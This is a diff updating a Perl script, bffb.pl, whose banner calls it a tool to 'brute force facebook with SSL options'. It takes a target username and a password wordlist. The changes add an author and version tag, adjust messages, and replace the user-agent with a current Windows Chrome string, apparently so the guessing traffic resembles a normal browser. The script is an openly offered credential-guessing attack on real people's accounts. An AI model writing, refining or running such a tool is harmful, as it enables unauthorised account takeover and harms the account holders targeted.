@@ -1,4 +1,6 @@
 #!/usr/bin/perl
+#Author: @haithamaouati
+#Version: 1.1
 
 use strict;
 use Net::SSLeay::Handle;
@@ -24,7 +26,7 @@ exit; }
 my $user = $ARGV[0];
 my $wordlist = $ARGV[1];
 
-open (LIST, $wordlist) || die "\n[:] No wordlist $wordlist\n";
+open (LIST, $wordlist) || die "\n[!] No wordlist $wordlist\n";
 
 print "\n";
 print "@@@@@@@   @@@@@@@@  @@@@@@@@  @@@@@@@   \n";
@@ -38,7 +40,7 @@ print ":!:  !:!  :!:       :!:       :!:  !:!  \n";
 print " :: ::::   ::        ::        :: ::::  \n";
 print ":: : ::    :         :        :: : ::   \n";
 print "\nbrute force facebook with SSL options \n";
-print "\nUsage: perl bffb.pl username wordlist.txt\n";
+print "\nUsage: perl bffb.pl $user $wordlist\n";
 print "\n";
 print " [*] Target: $user \n";
 print "\n";
@@ -53,7 +55,7 @@ my $c = "Connection: close";
 my $e = "Cache-Control: max-age=0";
 my $f = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
 my $g = "Origin: https://www.facebook.com";
-my $h = "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24";
+my $h = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.214 Safari/537.36";
 my $i = "Content-Type: application/x-www-form-urlencoded";
 my $j = "Accept-Encoding: gzip,deflate,sdch";
 my $k = "Accept-Language: en-US,en;q=0.8";
